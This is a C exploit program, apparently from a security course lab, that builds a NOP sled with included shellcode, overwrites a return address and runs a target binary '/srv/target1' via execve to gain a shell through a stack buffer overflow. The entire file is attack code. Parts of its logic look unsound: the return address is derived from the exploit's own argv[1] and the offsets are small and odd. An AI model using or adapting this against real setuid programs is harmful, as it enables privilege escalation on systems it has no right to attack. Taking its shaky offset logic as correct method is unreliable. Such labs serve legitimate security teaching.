#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

const int BUFFER_SIZE = 500;
const int OFFSET_TO_RET = 8;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;

int main(int argc, char *argv[]) {
    char *args[3];
    char *env[1];
    char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];

    // Print the addresses of relevant variables and the shellcode length
    printf("Address of buf: %p\n", (void*)buf);
    printf("Address of argv[0]: %p\n", (void*)argv[0]);
    printf("Address of argv[1]: %p\n", (void*)argv[1]);
    printf("Shellcode length: %d\n", SHELLCODE_LENGTH);

    // Check if argv[1] is set, otherwise print an error and exit
    if (argv[1] == NULL) {
        fprintf(stderr, "Error: argv[1] is not set. Please provide an argument.\n");
        exit(1);
    }

    // Fill the buffer with NOP instructions (\x90)
    memset(buf, '\x90', sizeof(buf));

    // Copy the shellcode to the end of the buffer
    memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);

    // Calculate the return address based on argv[1] and print it
    unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET + 200;
    printf("Chosen return address: 0x%x\n", return_address);

    // Overwrite the return address in the buffer
    *(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;

    // Print the contents of the buffer (up to 100 bytes) to verify the exploit setup
    printf("Buffer contents:\n");
    for (int i = 0; i < sizeof(buf); i++) {
        printf("\\x%02x", (unsigned char)buf[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");

    // Set up the arguments and environment for the target program
    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;
    env[0] = NULL;

    // Print the addresses of args[0] and args[1] to verify they are set correctly
    printf("Address of args[0]: %p\n", (void*)args[0]);
    printf("Address of args[1]: %p\n", (void*)args[1]);

    // Execute the target program
    printf("Executing target program...\n");
    execve(TARGET, args, env);

    // If execve returns, there was an error
    fprintf(stderr, "execve failed.\n");

    return 0;
}